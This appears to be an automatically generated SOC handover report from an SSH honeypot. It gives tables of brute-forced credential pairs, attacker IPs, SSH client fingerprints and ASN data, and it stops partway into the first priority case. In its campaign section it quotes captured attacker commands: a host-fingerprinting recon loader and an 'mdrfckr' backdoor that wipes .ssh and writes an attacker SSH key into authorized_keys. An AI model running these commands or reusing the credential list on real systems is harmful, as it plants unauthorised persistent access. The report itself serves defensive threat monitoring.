# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-19 |
| **Generated At** | 2026-07-19T09:55:54Z |
| **Shift Time** | 09:55 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **469** |
| Confirmed Threats | **445** |
| False Positives Filtered | **24** (5.1%) |
| Unique Attacker IPs | **160** |
| Countries of Origin | **35** |
| High Severity Cases | **274** |
| Medium Severity Cases | **1** |
| Low Severity Cases | **194** |
| Malware Samples Analyzed | **3** HIGH · **32** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **334** |
| Unique Credential Pairs | **196** |
| Unique Usernames | **78** |
| Unique Passwords | **144** |
| Successful Auth Pairs | **293** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 62 |
| `admin` | 52 |
| `config` | 17 |
| `nobody` | 13 |
| `support` | 13 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `Password` | 13 |
| `123456` | 12 |
| `admin` | 10 |
| `1234` | 9 |
| `support` | 8 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 9 |
| `support` | `support` | 8 |
| `admin` | `` | 8 |
| `config` | `webadmin` | 6 |
| `nobody` | `nobody2020` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `deploy` | `dev` | `91.92.40.14` | 2026-07-19T04:55:11 |
| `dspace` | `dspace` | `91.92.40.14` | 2026-07-19T04:55:26 |
| `www` | `user` | `91.92.40.14` | 2026-07-19T04:55:36 |
| `testuser` | `test` | `91.92.40.14` | 2026-07-19T04:55:47 |
| `vpn` | `vpn` | `91.92.40.14` | 2026-07-19T04:55:59 |
| `user1` | `123456789` | `91.92.40.14` | 2026-07-19T04:56:08 |
| `admin` | `12345` | `92.118.39.50` | 2026-07-19T04:56:17 |
| `pi` | `1` | `91.92.40.14` | 2026-07-19T04:56:18 |
| `cursor` | `cursor` | `91.92.40.14` | 2026-07-19T04:56:33 |
| `root` | `Pass1234` | `91.92.40.14` | 2026-07-19T04:56:45 |
| `root` | `admin1234` | `91.92.40.14` | 2026-07-19T04:57:00 |
| `deploy` | `toor` | `91.92.40.14` | 2026-07-19T04:57:08 |
| `nobody` | `nobody2020` | `182.53.52.68` | 2026-07-19T04:57:21 |
| `support` | `Password` | `179.185.18.67` | 2026-07-19T04:57:23 |
| `devops` | `123456` | `91.92.40.14` | 2026-07-19T04:57:28 |
| `root` | `!qaz@WSX` | `91.92.40.14` | 2026-07-19T04:57:43 |
| `support` | `Password` | `10.0.0.73` | 2026-07-19T04:57:47 |
| `root` | `Root@123` | `91.92.40.14` | 2026-07-19T04:57:54 |
| `admin` | `123456` | `92.118.39.50` | 2026-07-19T04:58:09 |
| `test1` | `test1` | `91.92.40.14` | 2026-07-19T04:58:15 |
| `root` | `1qaz@WSX3edc` | `91.92.40.14` | 2026-07-19T04:58:23 |
| `rdpuser` | `123456` | `91.92.40.14` | 2026-07-19T04:58:31 |
| `root` | `1q2w3e4r` | `91.92.40.14` | 2026-07-19T04:58:58 |
| `root` | `q1w2e3r4` | `91.92.40.14` | 2026-07-19T04:59:01 |
| `pi` | `12345678` | `91.92.40.14` | 2026-07-19T04:59:17 |
| `mysql` | `mysql123` | `91.92.40.14` | 2026-07-19T04:59:32 |
| `admin` | `123456789` | `92.118.39.50` | 2026-07-19T04:59:58 |
| `kingbase` | `kingbase` | `91.92.40.14` | 2026-07-19T05:00:03 |
| `user` | `12345` | `91.92.40.14` | 2026-07-19T05:00:07 |
| `packer` | `packer` | `91.92.40.14` | 2026-07-19T05:00:26 |
| `admin1` | `redhat` | `91.92.40.14` | 2026-07-19T05:00:44 |
| `nobody` | `nobody2020` | `179.184.218.49` | 2026-07-19T05:00:46 |
| `wizard` | `wizard` | `91.92.40.14` | 2026-07-19T05:00:49 |
| `nobody` | `nobody2020` | `10.0.0.73` | 2026-07-19T05:01:04 |
| `nobody` | `nobody2020` | `103.68.22.115` | 2026-07-19T05:01:05 |
| `deploy` | `user` | `91.92.40.14` | 2026-07-19T05:01:05 |
| `root` | `qazwsxedc!` | `185.242.3.195` | 2026-07-19T05:01:28 |
| `gabriel` | `1q2w3e4r` | `91.92.40.14` | 2026-07-19T05:01:30 |
| `admin` | `123qwe` | `92.118.39.50` | 2026-07-19T05:01:50 |
| `tester` | `test` | `91.92.40.14` | 2026-07-19T05:01:52 |
| `cw` | `cw` | `91.92.40.14` | 2026-07-19T05:02:04 |
| `guest` | `guest123` | `91.92.40.14` | 2026-07-19T05:02:14 |
| `vncuser` | `password` | `91.92.40.14` | 2026-07-19T05:02:29 |
| `stack` | `stack` | `91.92.40.14` | 2026-07-19T05:02:33 |
| `debian` | `toor` | `91.92.40.14` | 2026-07-19T05:03:13 |
| `milad` | `milad123` | `91.92.40.14` | 2026-07-19T05:03:23 |
| `user` | `root` | `65.20.141.202` | 2026-07-19T05:03:37 |
| `admin` | `123qwerty` | `92.118.39.50` | 2026-07-19T05:03:41 |
| `root` | `12345678` | `91.92.40.14` | 2026-07-19T05:03:43 |
| `user` | `root` | `82.193.122.91` | 2026-07-19T05:03:47 |
| `root` | `******` | `91.92.40.14` | 2026-07-19T05:03:54 |
| `user` | `1234` | `91.92.40.14` | 2026-07-19T05:04:06 |
| `supervisor` | `11111111` | `182.75.197.174` | 2026-07-19T05:04:30 |
| `test` | `12345678` | `91.92.40.14` | 2026-07-19T05:04:33 |
| `supervisor` | `11111111` | `14.48.112.8` | 2026-07-19T05:04:39 |
| `root` | `Aa@123456` | `91.92.40.14` | 2026-07-19T05:04:48 |
| `supervisor` | `11111111` | `10.0.0.73` | 2026-07-19T05:04:50 |
| `jack` | `jack` | `91.92.40.14` | 2026-07-19T05:04:54 |
| `worker` | `worker` | `91.92.40.14` | 2026-07-19T05:05:21 |
| `admin` | `21` | `92.118.39.50` | 2026-07-19T05:05:29 |
| `test1` | `123456789` | `91.92.40.14` | 2026-07-19T05:05:45 |
| `root` | `test123` | `91.92.40.14` | 2026-07-19T05:05:53 |
| `root` | `123123` | `91.92.40.14` | 2026-07-19T05:06:03 |
| `admin1` | `123456` | `91.92.40.14` | 2026-07-19T05:06:30 |
| `root` | `1234` | `91.92.40.14` | 2026-07-19T05:06:43 |
| `caldera` | `caldera` | `79.104.0.82` | 2026-07-19T05:06:44 |
| `345gs5662d34` | `345gs5662d34` | `79.104.0.82` | 2026-07-19T05:06:47 |
| `caldera` | `3245gs5662d34` | `79.104.0.82` | 2026-07-19T05:06:48 |
| `user` | `root` | `96.56.228.149` | 2026-07-19T05:06:52 |
| `ftpuser` | `123456789` | `91.92.40.14` | 2026-07-19T05:06:56 |
| `user` | `root` | `116.48.150.115` | 2026-07-19T05:07:00 |
| `root` | `google@123` | `165.154.227.158` | 2026-07-19T05:07:06 |
| `345gs5662d34` | `345gs5662d34` | `165.154.227.158` | 2026-07-19T05:07:10 |
| `root` | `3245gs5662d34` | `165.154.227.158` | 2026-07-19T05:07:12 |
| `admin` | `321` | `92.118.39.50` | 2026-07-19T05:07:16 |
| `potok` | `potok` | `91.92.40.14` | 2026-07-19T05:07:18 |
| `user` | `root` | `10.0.0.73` | 2026-07-19T05:07:24 |
| `root` | `1234567890` | `91.92.40.14` | 2026-07-19T05:07:28 |
| `web` | `web123` | `91.92.40.14` | 2026-07-19T05:07:46 |
| `appuser` | `12345` | `91.92.40.14` | 2026-07-19T05:08:12 |
| `hl` | `123456` | `119.13.106.88` | 2026-07-19T05:08:14 |
| `345gs5662d34` | `345gs5662d34` | `119.13.106.88` | 2026-07-19T05:08:18 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-19T05:08:19 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-19T05:08:19 |
| `hl` | `3245gs5662d34` | `119.13.106.88` | 2026-07-19T05:08:20 |
| `webuser` | `123456` | `91.92.40.14` | 2026-07-19T05:08:24 |
| `support` | `support` | `176.53.159.196` | 2026-07-19T05:08:38 |
| `student` | `student123` | `91.92.40.14` | 2026-07-19T05:08:50 |
| `root` | `Abcd1234` | `91.92.40.14` | 2026-07-19T05:09:04 |
| `admin` | `654321` | `92.118.39.50` | 2026-07-19T05:09:06 |
| `localhost` | `localhost` | `91.92.40.14` | 2026-07-19T05:09:22 |
| `devops` | `123456789` | `91.92.40.14` | 2026-07-19T05:09:25 |
| `rocky` | `1` | `91.92.40.14` | 2026-07-19T05:09:49 |
| `support` | `support` | `10.0.0.73` | 2026-07-19T05:09:57 |
| `username` | `123456` | `91.92.40.14` | 2026-07-19T05:10:01 |
| `gary` | `gary` | `91.92.40.14` | 2026-07-19T05:10:15 |
| `amin` | `amin` | `91.92.40.14` | 2026-07-19T05:10:35 |
| `root` | `nimda` | `91.92.40.14` | 2026-07-19T05:10:49 |
| `admin` | `Admin@123` | `92.118.39.50` | 2026-07-19T05:10:57 |
| `prefect` | `prefect` | `91.92.40.14` | 2026-07-19T05:11:15 |
| `onkar` | `onkar123` | `91.92.40.14` | 2026-07-19T05:11:30 |
| `root` | `Welcome@123` | `91.92.40.14` | 2026-07-19T05:11:38 |
| `zabbix` | `zabbix` | `91.92.40.14` | 2026-07-19T05:11:52 |
| `nobody` | `nobody` | `91.92.40.14` | 2026-07-19T05:11:57 |
| `tom` | `tom` | `91.92.40.14` | 2026-07-19T05:12:12 |
| `devops` | `1234` | `91.92.40.14` | 2026-07-19T05:12:28 |
| `admin` | `P@ssw0rd` | `92.118.39.50` | 2026-07-19T05:12:51 |
| `ivan` | `ivan` | `91.92.40.14` | 2026-07-19T05:12:54 |
| `niaoyun` | `123456` | `91.92.40.14` | 2026-07-19T05:13:07 |
| `root` | `1qazxsw2` | `91.92.40.14` | 2026-07-19T05:13:17 |
| `root` | `!QAZ2wsx3edc` | `91.92.40.14` | 2026-07-19T05:13:24 |
| `user` | `passw0rd` | `91.92.40.14` | 2026-07-19T05:13:50 |
| `milad` | `milad` | `91.92.40.14` | 2026-07-19T05:14:16 |
| `hadoop` | `hadoop` | `91.92.40.14` | 2026-07-19T05:14:22 |
| `testuser` | `123456` | `91.92.40.14` | 2026-07-19T05:14:27 |
| `minecraft` | `password` | `91.92.40.14` | 2026-07-19T05:14:32 |
| `admin` | `Password` | `92.118.39.50` | 2026-07-19T05:14:41 |
| `root` | `Abc123456` | `91.92.40.14` | 2026-07-19T05:14:57 |
| `developer` | `root` | `91.92.40.14` | 2026-07-19T05:15:04 |
| `root` | `741852963` | `91.92.40.14` | 2026-07-19T05:15:25 |
| `master` | `passwd` | `91.92.40.14` | 2026-07-19T05:15:47 |
| `hadoop` | `hadoop123` | `91.92.40.14` | 2026-07-19T05:15:55 |
| `amit` | `amit` | `91.92.40.14` | 2026-07-19T05:16:15 |
| `admin` | `admin` | `92.118.39.50` | 2026-07-19T05:16:30 |
| `root` | `CatCult2025!` | `91.92.40.14` | 2026-07-19T05:16:35 |
| `ftpuser` | `123456` | `91.92.40.14` | 2026-07-19T05:16:51 |
| `gabriel` | `gabriel` | `91.92.40.14` | 2026-07-19T05:16:53 |
| `admin` | `admin` | `207.175.116.89` | 2026-07-19T05:17:00 |
| `admin` | `admin#123` | `92.118.39.50` | 2026-07-19T05:18:18 |
| `default` | `66666` | `178.178.194.131` | 2026-07-19T05:18:56 |
| `admin` | `admin1` | `92.118.39.50` | 2026-07-19T05:20:08 |
| `admin` | `admin12` | `92.118.39.50` | 2026-07-19T05:21:59 |
| `config` | `config123` | `102.38.3.107` | 2026-07-19T05:22:02 |
| `config` | `config123` | `221.120.4.61` | 2026-07-19T05:22:11 |
| `default` | `66666` | `183.167.217.86` | 2026-07-19T05:22:32 |
| `default` | `66666` | `125.35.109.214` | 2026-07-19T05:22:43 |
| `default` | `66666` | `10.0.0.73` | 2026-07-19T05:23:01 |
| `admin` | `admin123` | `92.118.39.50` | 2026-07-19T05:23:47 |
| `admin` | `admin2024` | `92.118.39.50` | 2026-07-19T05:25:35 |
| `config` | `config123` | `10.0.0.73` | 2026-07-19T05:25:41 |
| `root` | `qazwsxedc!` | `10.0.0.73` | 2026-07-19T05:25:45 |
| `admin` | `admin@123` | `92.118.39.50` | 2026-07-19T05:27:30 |
| `root` | `welc0me` | `220.163.252.244` | 2026-07-19T05:28:37 |
| `root` | `welc0me` | `118.122.196.230` | 2026-07-19T05:28:51 |
| `admin` | `adminadmin` | `92.118.39.50` | 2026-07-19T05:29:17 |
| `root` | `123@@@` | `158.178.141.210` | 2026-07-19T05:30:42 |
| `root` | `LeitboGi0ro` | `158.178.141.210` | 2026-07-19T05:30:42 |
| `admin` | `default` | `92.118.39.50` | 2026-07-19T05:31:00 |
| `root` | `welc0me` | `45.181.101.95` | 2026-07-19T05:32:06 |
| `root` | `welc0me` | `10.0.0.73` | 2026-07-19T05:32:32 |
| `admin` | `letmein` | `92.118.39.50` | 2026-07-19T05:32:44 |
| `admin` | `pa$w0rd` | `92.118.39.50` | 2026-07-19T05:34:27 |
| `admin` | `pass@123` | `92.118.39.50` | 2026-07-19T05:36:13 |
| `admin` | `passw0rd` | `92.118.39.50` | 2026-07-19T05:38:01 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236` | `173.255.221.189` | 2026-07-19T05:38:44 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `66.228.53.162` | 2026-07-19T05:39:10 |
| `admin` | `password` | `92.118.39.50` | 2026-07-19T05:39:52 |
| `admin` | `qwerty` | `92.118.39.50` | 2026-07-19T05:41:43 |
| `admin` | `welcome1` | `92.118.39.50` | 2026-07-19T05:43:26 |
| `root` | `root1234` | `122.186.249.6` | 2026-07-19T05:43:50 |
| `ansible` | `12345` | `92.118.39.50` | 2026-07-19T05:45:13 |
| `ansible` | `123456` | `92.118.39.50` | 2026-07-19T05:47:04 |
| `admin` | `54321` | `119.200.229.33` | 2026-07-19T05:48:21 |
| `admin` | `54321` | `218.25.233.22` | 2026-07-19T05:48:34 |
| `centos` | `centos2002` | `5.140.212.144` | 2026-07-19T05:48:50 |
| `ansible` | `123456789` | `92.118.39.50` | 2026-07-19T05:48:57 |
| `centos` | `centos2002` | `10.0.0.73` | 2026-07-19T05:49:02 |
| `centos` | `centos2002` | `218.23.95.14` | 2026-07-19T05:49:06 |
| `ansible` | `ansible` | `92.118.39.50` | 2026-07-19T05:50:40 |
| `admin` | `54321` | `222.120.176.6` | 2026-07-19T05:51:51 |
| `admin` | `54321` | `92.255.196.185` | 2026-07-19T05:52:02 |
| `arnold` | `arnold` | `185.242.3.195` | 2026-07-19T05:52:20 |
| `ansible` | `ansible123` | `92.118.39.50` | 2026-07-19T05:52:23 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-19T05:54:03 |
| `ansible` | `password` | `92.118.39.50` | 2026-07-19T05:54:06 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-19T05:54:11 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-19T05:54:11 |
| `apache` | `admin` | `92.118.39.50` | 2026-07-19T05:55:47 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-19T05:55:53 |
| `root` | `Sj123456` | `46.24.47.94` | 2026-07-19T05:56:56 |
| `345gs5662d34` | `345gs5662d34` | `46.24.47.94` | 2026-07-19T05:56:58 |
| `root` | `3245gs5662d34` | `46.24.47.94` | 2026-07-19T05:56:59 |
| `root` | `admin1234567` | `10.0.0.73` | 2026-07-19T05:57:17 |
| `apache` | `apache` | `92.118.39.50` | 2026-07-19T05:57:28 |
| `apache` | `password` | `92.118.39.50` | 2026-07-19T05:59:10 |
| `backup` | `123qwe` | `92.118.39.50` | 2026-07-19T06:00:53 |
| `backup` | `54321` | `92.118.39.50` | 2026-07-19T06:02:37 |
| `backup` | `backup` | `92.118.39.50` | 2026-07-19T06:04:25 |
| `backup` | `backup1` | `92.118.39.50` | 2026-07-19T06:06:16 |
| `backup` | `backup12` | `92.118.39.50` | 2026-07-19T06:08:03 |
| `ftpuser` | `1234` | `14.194.128.158` | 2026-07-19T06:08:40 |
| `ftpuser` | `1234` | `82.65.140.218` | 2026-07-19T06:08:47 |
| `root` | `root2015` | `103.67.152.201` | 2026-07-19T06:09:13 |
| `root` | `root2015` | `58.56.128.190` | 2026-07-19T06:09:30 |
| `backup` | `backup123` | `92.118.39.50` | 2026-07-19T06:09:51 |
| `backup` | `password` | `92.118.39.50` | 2026-07-19T06:11:45 |
| `ftpuser` | `1234` | `196.189.126.10` | 2026-07-19T06:12:09 |
| `ftpuser` | `1234` | `154.146.238.122` | 2026-07-19T06:12:16 |
| `root` | `root2015` | `124.239.169.52` | 2026-07-19T06:12:30 |
| `ftpuser` | `1234` | `10.0.0.73` | 2026-07-19T06:12:31 |
| `backup` | `wasd` | `92.118.39.50` | 2026-07-19T06:13:36 |
| `debian` | `12345` | `92.118.39.50` | 2026-07-19T06:15:27 |
| `ubnt` | `qwerty123456` | `182.139.39.150` | 2026-07-19T06:16:29 |
| `arnold` | `arnold` | `10.0.0.73` | 2026-07-19T06:16:31 |
| `ubnt` | `qwerty123456` | `196.188.93.169` | 2026-07-19T06:16:43 |
| `ubnt` | `qwerty123456` | `10.0.0.73` | 2026-07-19T06:16:55 |
| `debian` | `123456` | `92.118.39.50` | 2026-07-19T06:17:12 |
| `admin` | `1q2w3e4r` | `178.178.222.55` | 2026-07-19T06:18:23 |
| `admin` | `1q2w3e4r` | `64.72.74.162` | 2026-07-19T06:18:29 |
| `debian` | `123456789` | `92.118.39.50` | 2026-07-19T06:18:58 |
| `debian` | `123qwe` | `92.118.39.50` | 2026-07-19T06:20:38 |
| `admin` | `1q2w3e4r` | `45.170.50.2` | 2026-07-19T06:21:53 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-19T06:31:13 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-19T06:31:15 |
| `config` | `webadmin` | `200.105.141.172` | 2026-07-19T06:33:12 |
| `config` | `webadmin` | `189.56.0.19` | 2026-07-19T06:33:32 |
| `Root` | `123123` | `128.199.118.234` | 2026-07-19T06:33:35 |
| `Root` | `123123` | `220.246.43.109` | 2026-07-19T06:33:45 |
| `config` | `webadmin` | `183.223.156.154` | 2026-07-19T06:36:31 |
| `config` | `webadmin` | `112.25.140.211` | 2026-07-19T06:36:47 |
| `config` | `webadmin` | `10.0.0.73` | 2026-07-19T06:36:51 |
| `Root` | `123123` | `185.2.228.48` | 2026-07-19T06:37:02 |
| `Root` | `123123` | `50.217.40.11` | 2026-07-19T06:37:13 |
| `admin` | `admin` | `72.210.6.207` | 2026-07-19T06:40:09 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-19T06:40:26 |
| `debian` | `123` | `192.34.128.202` | 2026-07-19T06:41:20 |
| `melissa` | `123` | `185.242.3.195` | 2026-07-19T06:43:05 |
| `12qwaszx` | `12qwaszx` | `179.189.85.66` | 2026-07-19T06:46:45 |
| `12qwaszx` | `12qwaszx` | `112.94.5.43` | 2026-07-19T06:46:56 |
| `nobody` | `nobody2008` | `183.82.108.109` | 2026-07-19T07:00:06 |
| `nobody` | `nobody2008` | `10.0.0.73` | 2026-07-19T07:00:35 |
| `debian` | `123654` | `125.139.124.120` | 2026-07-19T07:01:53 |
| `debian` | `123654` | `171.8.42.112` | 2026-07-19T07:02:04 |
| `blank` | `password321` | `211.22.222.251` | 2026-07-19T07:02:54 |
| `blank` | `password321` | `183.167.217.86` | 2026-07-19T07:03:04 |
| `blank` | `password321` | `10.0.0.73` | 2026-07-19T07:06:27 |
| `melissa` | `123` | `10.0.0.73` | 2026-07-19T07:06:54 |
| `support` | `p@ssw0rd` | `218.4.156.254` | 2026-07-19T07:11:42 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.22.117.112` | 2026-07-19T07:18:35 |
| `*1` | `$4` | `34.22.117.112` | 2026-07-19T07:18:43 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 8372` | `34.22.117.112` | 2026-07-19T07:18:45 |
| `unknown` | `unknown2011` | `202.72.196.75` | 2026-07-19T07:21:22 |
| `unknown` | `unknown2011` | `113.11.34.221` | 2026-07-19T07:21:35 |
| `admin` | `admin` | `47.236.161.139` | 2026-07-19T07:22:01 |
| `unknown` | `unknown2011` | `103.174.80.40` | 2026-07-19T07:24:26 |
| `unknown` | `unknown2011` | `195.222.57.183` | 2026-07-19T07:24:33 |
| `nobody` | `ubuntu` | `213.126.222.66` | 2026-07-19T07:31:06 |
| `nobody` | `ubuntu` | `223.82.86.2` | 2026-07-19T07:31:15 |
| `nobody` | `ubuntu` | `10.0.0.73` | 2026-07-19T07:31:27 |
| `william` | `123` | `185.242.3.195` | 2026-07-19T07:33:19 |
| `root` | `012345670` | `220.178.246.43` | 2026-07-19T07:33:19 |
| `root` | `012345670` | `182.73.164.228` | 2026-07-19T07:36:33 |
| `root` | `012345670` | `213.154.80.51` | 2026-07-19T07:36:40 |
| `root` | `012345670` | `10.0.0.73` | 2026-07-19T07:36:54 |
| `blank` | `blank2016` | `103.68.52.210` | 2026-07-19T07:44:39 |
| `blank` | `blank2016` | `196.189.59.226` | 2026-07-19T07:47:52 |
| `blank` | `blank2016` | `218.59.235.170` | 2026-07-19T07:48:07 |
| `blank` | `blank2016` | `10.0.0.73` | 2026-07-19T07:48:22 |
| `alex` | `1234` | `10.0.0.73` | 2026-07-19T07:52:14 |
| `jojo` | `jojo123` | `10.0.0.73` | 2026-07-19T07:56:09 |
| `william` | `123` | `10.0.0.73` | 2026-07-19T07:57:20 |
| `config` | `Password` | `186.235.193.170` | 2026-07-19T07:58:00 |
| `config` | `Password` | `24.207.66.154` | 2026-07-19T07:58:08 |
| `config` | `Password` | `213.230.64.246` | 2026-07-19T08:01:33 |
| `config` | `Password` | `10.0.0.73` | 2026-07-19T08:01:59 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.205.66.149` | 2026-07-19T08:05:34 |
| `*1` | `$4` | `35.205.66.149` | 2026-07-19T08:05:48 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 3193` | `35.205.66.149` | 2026-07-19T08:05:50 |
| `admin` | `!QAZ2wsx#EDC` | `63.135.169.175` | 2026-07-19T08:13:30 |
| `admin` | `!QAZ2wsx#EDC` | `175.206.1.60` | 2026-07-19T08:13:42 |
| `root` | `root@3000` | `185.100.84.174` | 2026-07-19T08:18:38 |
| `Admin` | `1q2w3e4r5t` | `10.0.0.73` | 2026-07-19T08:21:14 |
| `user` | `Password` | `117.204.1.45` | 2026-07-19T08:23:09 |
| `user` | `Password` | `45.118.49.18` | 2026-07-19T08:23:22 |
| `root` | `qq123` | `185.242.3.195` | 2026-07-19T08:23:42 |
| `user` | `Password` | `10.0.0.73` | 2026-07-19T08:26:54 |
| `config` | `qwerty12` | `172.90.128.97` | 2026-07-19T08:32:48 |
| `config` | `qwerty12` | `117.254.104.107` | 2026-07-19T08:32:58 |
| `config` | `qwerty12` | `124.67.120.106` | 2026-07-19T08:36:07 |
| `root` | `a123456789` | `222.186.68.153` | 2026-07-19T08:41:42 |
| `root` | `a123456789` | `65.20.198.159` | 2026-07-19T08:41:51 |
| `root` | `a123456789` | `10.0.0.73` | 2026-07-19T08:42:09 |
| `supervisor` | `abc123` | `182.75.197.174` | 2026-07-19T08:45:29 |
| `supervisor` | `abc123` | `10.0.0.73` | 2026-07-19T08:45:51 |
| `root` | `qq123` | `10.0.0.73` | 2026-07-19T08:47:59 |
| `debian` | `logon` | `107.135.117.245` | 2026-07-19T08:48:29 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.78.176.229` | 2026-07-19T08:48:32 |
| `debian` | `logon` | `153.37.177.219` | 2026-07-19T08:48:38 |
| `*1` | `$4` | `34.78.176.229` | 2026-07-19T08:48:45 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 239` | `34.78.176.229` | 2026-07-19T08:48:47 |
| `debian` | `logon` | `61.169.54.150` | 2026-07-19T08:51:50 |
| `debian` | `logon` | `101.13.4.128` | 2026-07-19T08:51:59 |
| `debian` | `logon` | `10.0.0.73` | 2026-07-19T08:52:17 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **469** |
| Sessions with Fingerprint | **20** |
| Unique HASSH Fingerprints | **20** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 162 |
| OpenSSH | 86 |
| libssh | 32 |
| Paramiko (Python) | 10 |
| Nmap scanner | 7 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 86 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 85 | 82 |
| `2ec37a7cc8da...` | Mirai/variant | 48 | 1 |
| `f555226df196...` | Mirai/variant | 12 | 4 |
| `16443846184e...` | Generic scanner | 11 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 86 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 85 | 82 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 48 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 16 | 6 | — |
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 11 | 2 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 8 | 3 | Mirai/variant |
| `e788c657d1a2...` | Nmap scanner | 6 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 48 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.50`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `79.104.0.82`, `165.154.227.158`, `46.24.47.94`, `119.13.106.88`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **160** |
| Unique ASNs | **88** |
| High-Risk ASNs | **85** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 13 | HIGH |
| `AS46562` | Performive LLC | 10 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 8 | HIGH |
| `AS63949` | Akamai Connected Cloud | 8 | HIGH |
| `AS4766` | Korea Telecom | 5 | HIGH |
| `AS396982` | Google LLC | 5 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (275)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-adb7b8ef72bd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:55 |
| **Last Seen** | 2026-07-19 04:55 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

